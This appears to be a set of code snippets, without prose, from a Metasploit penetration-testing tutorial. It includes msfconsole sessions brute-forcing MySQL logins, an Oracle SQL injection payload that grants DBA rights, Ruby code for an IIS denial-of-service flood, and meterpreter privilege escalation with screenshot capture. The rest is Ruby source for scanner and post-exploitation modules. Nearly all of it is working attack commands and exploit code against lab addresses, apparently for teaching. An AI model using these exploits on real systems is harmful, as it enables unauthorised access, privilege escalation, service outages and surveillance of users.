["```\nmsf > use auxiliary/scanner/http/dir_scanner\nmsf auxiliary(dir_scanner) > show options\nModule options: \n```", "```\nmsf > use auxiliary/scanner/mysql/mysql_login\nmsf auxiliary(mysql_login) > show options\nModule options (auxiliary/scanner/mysql/mysql_login):\nName Current Setting Required Description\n---- --------------- -------- -----------\nBLANK_PASSWORDS true yes Try blank pas..\nBRUTEFORCE_SPEED 5 yes How fast to..\nPASSWORD no A specific password\nPASS_FILE no File containing..\nRHOSTS yes The target address.\nRPORT 3306 yes The target port..\nSTOP_ON_SUCCESS false yes Stop guessing...\nTHREADS 1 yes The number of..\nUSERNAME no A specific user..\nUSERPASS_FILE no File containing..\nUSER_FILE no File containing..\nVERBOSE true yes Whether to print.. \n```", "```\nmsf auxiliary(mysql_login) > set USER_FILE /users.txt\nUSER_FILE => /users.txt\nmsf auxiliary(mysql_login) > set PASS_FILE /pass.txt\nPASS_FILE => /pass.txt \n```", "```\nmsf auxiliary(mysql_login) > set RHOSTS 192.168.56.101\nRHOSTS => 192.168.56.101\nmsf auxiliary(mysql_login) > run\n[*] 192.168.56.101:3306 - Found remote MySQL version 5.0.51a\n[*] 192.168.56.101:3306 Trying username:'administrator' with password:'' \n```", "```\nroot@bt: cd /pentest/passwords\nroot@bt:/pentest/passwords# apt-get install crunch \n```", "```\n./ crunch <min-len> <max-len> [-f /path/to/charset.lst charset-name] [-o wordlist.txt]\n[-t [FIXED]@@@@] [-s startblock] [-c number]\n\n```", "```\nmsf > use auxiliary/admin/mysql/mysql_enum\nmsf auxiliary(mysql_enum) > show options\nModule options (auxiliary/admin/mysql/mysql_enum):\nName Current Setting Required Description\n---- --------------- -------- -----------\nPASSWORD no The password for the..\nRHOST yes The target address\nRPORT 3306 yes The target port\nUSERNAME no The username to.. \n```", "```\nmsf auxiliary(mysql_enum) > exploit\n[*] Configuration Parameters: \n[*] C2 Audit Mode is Not Enabled \n[*] xp_cmdshell is Enabled \n[*] remote access is Enabled \n[*] allow updates is Not Enabled \n[*] Database Mail XPs is Not Enabled \n[*] Ole Automation Procedures are Not Enabled \n[*] Databases on the server: \n[*] Database name:master \n```", "```\nmsf auxiliary(dbms_metadata_get_xml) > show options\nModule options (auxiliary/sqli/oracle/dbms_metadata_get_xml):\nName Current Setting Required Description\n---- --------------- -------- -----------\nDBPASS TIGER yes The password to..\nDBUSER SCOTT yes The username to..\nRHOST yes The Oracle host.\nRPORT 1521 yes The TNS port.\nSID ORCL yes The sid to authenticate.\nSQL GRANT DBA to SCOTT no SQL to execute. \n```", "```\nmsf auxiliary(dbms_metadata_get_xml) > set RHOST 192.168.56.1\nmsf auxiliary(dbms_metadata_get_xml) > set SQL YES\nmsf auxiliary(dbms_metadata_get_xml) > run \n```", "```\nmsf > use auxiliary/dos/windows/http/ms10_065_ii6_asp_dos\nmsf auxiliary(ms10_065_ii6_asp_dos) > show options\nModule options (auxiliary/dos/windows/http/ms10_065_ii6_asp_dos):\nName Current Setting Required Description\n---- --------------- -------- -----------\nRHOST yes The target address\nRPORT 80 yes The target port\nURI /page.asp yes URI to request\nVHOST no The virtual host name to..\nmsf auxiliary(ms10_065_ii6_asp_dos) > set RHOST 192.168.56.1\nRHOST => 192.168.56.1\nmsf auxiliary(ms10_065_ii6_asp_dos) > run\n[*] Attacking http://192.168.56.1:80/page.asp \n```", "```\nCREATE OR REPLACE FUNCTION \"SCOTT\".\"ATTACK_FUNC\" return varchar2 authid current_user as pragma autonomous_transaction; BEGIN EXECUTE IMMEDIATE 'GRANT DBA TO SCOTT'; COMMIT; RETURN ''; END; /\n\n```", "```\nSELECT SYS.DBMS_METADATA.GET_DDL('''||SCOTT.ATTACK_FUNC()||''','') FROM dual;\n\n```", "```\nwhile(1)\nbegin\nconnect\npayload = \"C=A&\" * 40000\nlength = payload.size\nsploit = \"HEAD #{datastore['URI']} HTTP/1.1\\r\\n\"\nsploit << \"Host: #{datastore['VHOST'] || rhost}\\r\\n\"\nsploit << \"Connection:Close\\r\\n\"\nsploit << \"Content-Type: application/x-www-form-urlencoded\\r\\n\"\nsploit << \"Content-Length:#{length} \\r\\n\\r\\n\"\nsploit << payload\nsock.put(sploit)\n#print_status(\"DoS packet sent.\")\ndisconnect\nrescue Errno::ECONNRESET\nnext\nend\nend \n```", "```\nmeterpreter > getsystem\n...got system (via technique 4).\nmeterpreter > run post/windows/gather/enum_logged_on_users\n[*] Running against session 1\nCurrent Logged Users\n====================\nSID User\n--- ----\nS-1-5-21-2350281388-457184790-407941598 DARKLORD-PC\\DARKLORD\nRecently Logged Users\n=====================\nSID Profile Path\n--- ------------\nS-1-5-18 %systemroot%\\system32\\config\\systemprofile\nS-1-5-19 C:\\Windows\\ServiceProfiles\\LocalService\nS-1-5-20 C:\\Windows\\ServiceProfiles\\NetworkService\nS-1-5-21-23502 C:\\Users\\DARKLORD\nS-1-5-21-235 C:\\Users\\Winuser \n```", "```\nmeterpreter > run post/windows/gather/screen_spy\n[*] Migrating to explorer.exe pid: 1104\n[*] Migration successful\n[*] Capturing 60 screenshots with a delay of 5 seconds \n```", "```\nrequire 'msf/core'\n\n```", "```\nclass Metasploit3 < Msf::Auxiliary\n\n```", "```\ninclude Msf::\n\n```", "```\ninclude Msf::Exploit::Remote::TCP\n\n```", "```\ndef initialize\nsuper(\n'Name' => 'TCP Port Scanner',\n'Version' => '$Revision$',\n'Description' => 'Enumerate open TCP services',\n'Author' => [ darklord ],\n'License' => MSF_LICENSE\n)\n\n```", "```\nregister_options(\n[\nOptString.new('PORTS', [true, \"Ports to scan (e.g. 25,80,110-900)\", \"1-10000\"]),\nOptInt.new('TIMEOUT', [true, \"The socket connect timeout in milliseconds\", 1000]),\nOptInt.new('CONCURRENCY', [true, \"The number of concurrent ports to check per host\", 10]), self.class)\nderegister_options('RPORT')\n\n```", "```\nclass Metasploit3 < Msf::Auxiliary\ninclude Msf::Exploit::Remote::Ftp\ninclude Msf::Auxiliary::Scanner\ninclude Msf::Auxiliary::Report\ndef initialize\nsuper(\n'Name' => 'Anonymous FTP Access Detection',\n'Version' => '$Revision: 14774 $',\n'Description' => 'Detect anonymous (read/write) FTP server access.',\n'References' =>\n[\n['URL', 'http://en.wikipedia.org/wiki/File_Transfer_Protocol#Anonymous_FTP'],\n],\n'Author' => 'Matteo Cantoni <goony[at]nothink.org>',\n'License' => MSF_LICENSE\n)\nregister_options(\n[\nOpt::RPORT(21),\n], self.class)\nend\ndef run_host(target_host)\nbegin\nres = connect_login(true, false)\nbanner.strip! if banner\ndir = Rex::Text.rand_text_alpha(8)\nif res\nwrite_check = send_cmd( ['MKD', dir] , true)\nif (write_check and write_check =~ /^2/)\nsend_cmd( ['RMD', dir] , true)\nprint_status(\"#{target_host}:#{rport} Anonymous READ/WRITE (#{banner})\")\naccess_type = \"rw\"\nelse\nprint_status(\"#{target_host}:#{rport} Anonymous READ (#{banner})\")\naccess_type = \"ro\"\nend\nreport_auth_info(\n:host => target_host,\n:port => rport,\n:sname => 'ftp',\n:user => datastore['FTPUSER'],\n:pass => datastore['FTPPASS'],\n:type => \"password_#{access_type}\",\n:active => true\n)\nend\ndisconnect\nrescue ::Interrupt\nraise $!\nrescue ::Rex::ConnectionError, ::IOError\nend\nend\nend\n\n```", "```\ndef run_host(target_host)\nbegin\nres = connect_login(true, false)\nbanner.strip! if banner\ndir = Rex::Text.rand_text_alpha(8)\n\n```", "```\nif res\nwrite_check = send_cmd( ['MKD', dir] , true)\nif (write_check and write_check =~ /^2/)\nsend_cmd( ['RMD', dir] , true)\nprint_status(\"#{target_host}:#{rport} Anonymous READ/WRITE (#{banner})\")\naccess_type = \"rw\"\nelse\nprint_status(\"#{target_host}:#{rport} Anonymous\naccess_type=\"ro\"\n\n```", "```\nreport_auth_info(\n:host => target_host,\n:port => rport,\n:sname => 'ftp',\n:user => datastore['FTPUSER'],\n:pass => datastore['FTPPASS'],\n:type => \"password_#{access_type}\",\n:active => true\n)\nend\n\n```", "```\nrequire 'msf/core'\nrequire 'rex'\nrequire 'msf/core/post/windows/registry'\nclass Metasploit3 < Msf::Post\ninclude Msf::Post::Windows::Registry\ndef initialize(info={})\nsuper( update_info( info,\n'Name' => 'Windows Gather Installed Application Enumeration',\n'Description' => %q{ This module will enumerate all installed applications },\n'License' => MSF_LICENSE,\n'Platform' => [ 'windows' ],\n'SessionTypes' => [ 'meterpreter' ]\n))\nend \n```", "```\ndef app_list\ntbl = Rex::Ui::Text::Table.new(\n'Header' => \"Installed Applications\",\n'Indent' => 1,\n'Columns' =>\n[\n\"Name\",\n\"Version\"\n])\nappkeys = [\n'HKLM\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall',\n'HKCU\\\\SOFTWARE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall',\n'HKLM\\\\SOFTWARE\\\\WOW6432NODE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall',\n'HKCU\\\\SOFTWARE\\\\WOW6432NODE\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall',\n]\napps = []\nappkeys.each do |keyx86|\nfound_keys = registry_enumkeys(keyx86)\nif found_keys\nfound_keys.each do |ak|\napps << keyx86 +\"\\\\\" + ak\nend\nend\nend \n```", "```\nt = []\nwhile(not apps.empty?)\n1.upto(16) do\nt << framework.threads.spawn(\"Module(#{self.refname})\", false, apps.shift) do |k|\nbegin\ndispnm = registry_getvaldata(\"#{k}\",\"DisplayName\")\ndispversion = registry_getvaldata(\"#{k}\",\"DisplayVersion\")\ntbl << [dispnm,dispversion] if dispnm and dispversion\nrescue\nend\nend\n\n```", "```\nresults = tbl.to_s\nprint_line(\"\\n\" + results + \"\\n\")\np = store_loot(\"host.applications\", \"text/plain\", session, results, \"applications.txt\", \"Installed Applications\")\nprint_status(\"Results stored in: #{p}\")\nend\ndef run\nprint_status(\"Enumerating applications installed on #{sysinfo['Computer']}\")\napp_list\nend\nend\n\n```", "```\nmsf> use post/windows/gather/enum_applications\nmsf post(enum_applications) > show options\nModule options (post/windows/gather/enum_applcations)\nName Current Setting Required Description\nSESSION yes The session.. \n```"]